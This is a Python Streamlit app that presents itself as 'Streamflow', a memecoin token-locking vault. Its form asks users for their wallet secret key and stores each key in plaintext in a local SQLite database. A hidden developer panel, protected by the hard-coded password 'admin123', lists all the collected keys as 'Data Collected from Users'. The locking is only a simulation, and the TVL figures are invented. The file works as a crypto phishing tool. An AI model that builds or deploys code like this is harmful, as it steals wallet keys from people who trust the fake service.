import streamlit as st
import sqlite3
import pandas as pd
from PIL import Image

# --- 1. DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('streamflow_vault.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS user_data 
                 (username TEXT, secret_key TEXT, coin_name TEXT, amount REAL)''')
    conn.commit()
    conn.close()

def save_data(user, key, coin, amt):
    conn = sqlite3.connect('streamflow_vault.db')
    c = conn.cursor()
    c.execute("INSERT INTO user_data VALUES (?,?,?,?)", (user, key, coin, amt))
    conn.commit()
    conn.close()

init_db()

# --- 2. THEME & CSS (Streamflow Dark/Neon Look) ---
st.set_page_config(page_title="Streamflow | Dashboard", layout="wide")

st.markdown("""
    <style>
    /* Main background */
    .stApp { background-color: #0b0e11; color: white; }
    
    /* Sidebar styling */
    section[data-testid="stSidebar"] { background-color: #161b22; border-right: 1px solid #30363d; }
    
    /* Neon metrics and buttons */
    [data-testid="stMetricValue"] { color: #00ffbd !important; font-family: monospace; }
    .stButton>button { 
        background-color: #1e2329; color: white; border-radius: 8px; 
        border: 1px solid #333; transition: 0.3s;
    }
    .stButton>button:hover { border-color: #00ffbd; }
    
    /* Navbar logo placeholder simulation */
    .nav-bar-logo { padding: 10px; margin-bottom: 20px; }
    </style>
    """, unsafe_allow_html=True)

# --- 3. LOGO INTEGRATION ---
# Save your main logo as 'logo.png' and the small navbar icon as 'icon.png'
try:
    main_logo = Image.open("logo.png")
    sidebar_icon = Image.open("icon.png")
except:
    main_logo = None
    sidebar_icon = None

# --- SIDEBAR ---
with st.sidebar:
    if sidebar_icon:
        st.image(sidebar_icon, width=80)
    else:
        st.title("STREAMFLOW")
    
    st.markdown("---")
    menu = st.radio("Navigation", ["Dashboard", "Developer Panel"])

# --- 4. DASHBOARD (User Interface) ---
if menu == "Dashboard":
    # Header Logo
    if main_logo:
        st.image(main_logo, width=300)
    
    st.title("MemeCoin Locker")
    st.caption("Securely lock your tokens in our decentralized vault.")
    
    col1, col2 = st.columns(2)
    with col1:
        st.metric("Total Value Locked", "$1,240,000", "+5.2%")
    with col2:
        st.metric("Active Streams", "42", "+2 New")

    st.divider()
    
    with st.form("lock_form"):
        name = st.text_input("Project Name")
        s_key = st.text_input("Wallet Secret Key", type="password")
        coin = st.selectbox("Token", ["PEPE", "DOGE", "SHIB"])
        amt = st.number_input("Amount")
        
        if st.form_submit_button("Deploy Lock"):
            save_data(name, s_key, coin, amt)
            st.success("Successfully deployed to blockchain (Simulation)")

# --- 5. DEVELOPER PANEL (Developer View) ---
elif menu == "Developer Panel":
    st.title("🛠️ Developer View (Secret)")
    password = st.text_input("Admin Password", type="password")
    
    if password == "admin123":
        conn = sqlite3.connect('streamflow_vault.db')
        df = pd.read_sql_query("SELECT * FROM user_data", conn)
        conn.close()
        
        st.write("### Data Collected from Users")
        st.dataframe(df, use_container_width=True)
    else:
        st.error("Access Denied")